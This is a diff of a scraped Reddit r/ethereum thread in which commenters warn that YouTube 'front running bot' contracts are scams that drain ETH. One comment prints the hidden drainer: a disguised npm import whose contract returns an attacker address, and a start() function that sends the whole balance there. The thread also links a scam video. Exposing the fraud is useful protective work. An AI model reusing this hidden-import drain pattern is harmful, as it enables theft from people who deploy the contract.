@@ -14,8 +14,8 @@
             "url": "https://www.reddit.com/r/ethereum/comments/urc3gk/front_running_bot/",
             "author": "iammagnanimous",
             "created_utc": 1652753609.0,
-            "score": 3,
-            "num_comments": 33,
+            "score": 6,
+            "num_comments": 43,
             "subreddit": "ethereum",
             "selftext": "There is a video on YouTube of how to make a front running bot and make a lot of profit a day. Feels scamish. the explanation on how it works is not clear. Scans the mempool for pending transactions and sandwiches a transaction and takes profit. Can someone perhaps explain how this works or if it is BS?",
             "stickied": false,
@@ -23,7 +23,7 @@
                 {
                     "id": "i8x44xv",
                     "author": "harpocryptes",
-                    "score": 5,
+                    "score": 6,
                     "created_utc": 1652771355.0,
                     "response": "Front running is a real thing, but I've seen videos pretending to demonstrate that and give you the code to run one as a smart contract yourself. Those were definitely scams aiming at stealing your eth. Be careful.",
                     "depth": 1,
@@ -62,7 +62,7 @@
                 {
                     "id": "i8wdy62",
                     "author": "olihowells",
-                    "score": 4,
+                    "score": 5,
                     "created_utc": 1652754154.0,
                     "response": "It is exploiting and only removes value from the network, however the network is decentralised so no one is stopping you from doing what you like.",
                     "depth": 1,
@@ -170,6 +170,25 @@
                             "response": "1.7 ETH and rising",
                             "depth": 2,
                             "comments": []
+                        },
+                        {
+                            "id": "i91v5da",
+                            "author": "UnderLagger",
+                            "score": 2,
+                            "created_utc": 1652863033.0,
+                            "response": "if I may ask you pschoffer,  where is the address in the code ?   how does it point out to this wallet ? I'm curious because I tried to read all the code but found only the Weth address, nothing about the address you gave.",
+                            "depth": 2,
+                            "comments": [
+                                {
+                                    "id": "i91yxp9",
+                                    "author": "pschoffer",
+                                    "score": 2,
+                                    "created_utc": 1652866587.0,
+                                    "response": "Of course! It's definitely well hidden. Took me a while to find. I would even say smart although obviously evil.\n\nSo they have bunch of imports on top including:\n\n`//New Token Scan`  \n`import \"routerswap/protocol/pool\";`\n\nWhat remix does is that it will go to npm and fetch that package from [there](https://www.npmjs.com/package/routerswap)\n\nWell and then if you would inspect the content you get sort of this code:\n\n`pragma solidity ^0.6.6;`\r  \n\r  \n`contract Manager {`\r  \n\t`function performTasks() public {`\r  \n  \n\t`}`\r  \n\r  \n\t`function uniswapDepositAddress() public pure returns (address) {`\r  \n\t\t`return 0xBe90D3D88ca52B16D822Ec62009Aa474BAA92b23;`\r  \n\t`}`\r  \n`}`\n\nThen just check how Manager is used in the smart contract in the start method:\n\n `function start() public payable {`   \n`payable(manager.uniswapDepositAddress()).transfer(address(this).balance);`  \n`}`\n\n(Sorry about the formatting I am still struggling with Reddit a bit)",
+                                    "depth": 3,
+                                    "comments": []
+                                }
+                            ]
                         }
                     ]
                 },
@@ -196,7 +215,17 @@
                                     "created_utc": 1652795144.0,
                                     "response": "The contract linked above can extract eth from your wallet only :) \n\n[https://www.reddit.com/r/ethereum/comments/urc3gk/comment/i8y16w2/?utm\\_source=share&utm\\_medium=web2x&context=3](https://www.reddit.com/r/ethereum/comments/urc3gk/comment/i8y16w2/?utm_source=share&utm_medium=web2x&context=3)\n\nHow the bots normally work is that there is a script that runs on your laptop or a server and that scripts does the scanning, not some on-chain contract that would magically do that. \n\nContracts don't run by themselves they need a transaction to trigger anything.",
                                     "depth": 3,
-                                    "comments": []
+                                    "comments": [
+                                        {
+                                            "id": "i91t45a",
+                                            "author": "UnderLagger",
+                                            "score": 2,
+                                            "created_utc": 1652861126.0,
+                                            "response": "thank you very much for giving a clear reply with some explanations. at least you saved me some little $ I'd have put in this scam. for you guys it is clear but for layman you can't really know until you test it or someone knowlegeable explain it to you that it is a scam. so again thank you",
+                                            "depth": 4,
+                                            "comments": []
+                                        }
+                                    ]
                                 }
                             ]
                         }
@@ -264,6 +293,24 @@
                     "score": 1,
                     "created_utc": 1652838903.0,
                     "response": "Recorded voice over from a fiverr hire to hide the Indian accent, nothing suspicious at all",
+                    "depth": 1,
+                    "comments": []
+                },
+                {
+                    "id": "i96d56y",
+                    "author": "pschoffer",
+                    "score": 1,
+                    "created_utc": 1652945395.0,
+                    "response": "Ha, so YouTube took down the original video.  \n\n\nBut this one is still up.   \n[https://www.youtube.com/watch?v=vytcLjYwcc8&ab\\_channel=Web3Ape](https://www.youtube.com/watch?v=vytcLjYwcc8&ab_channel=Web3Ape)\n\nI flagged that one as well. But that one has some decent bot army liking it.",
+                    "depth": 1,
+                    "comments": []
+                },
+                {
+                    "id": "i9anlfq",
+                    "author": "MoistConcert420",
+                    "score": 1,
+                    "created_utc": 1653025782.0,
+                    "response": "Look up MEV than you'll learn.\n\nGas wars -> MEV -> anti mev bots -> sandwich attacks -> renting out spots on memchain.\n\nIt's a never ending battle.",
                     "depth": 1,
                     "comments": []
                 }
